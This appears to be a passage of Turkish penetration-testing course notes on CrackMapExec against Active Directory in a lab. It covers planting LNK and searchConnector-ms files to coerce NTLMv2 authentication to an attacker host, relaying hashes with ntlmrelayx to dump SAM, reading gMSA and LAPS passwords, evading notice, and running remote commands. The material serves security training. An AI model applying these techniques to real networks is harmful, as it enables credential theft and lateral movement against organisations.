+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
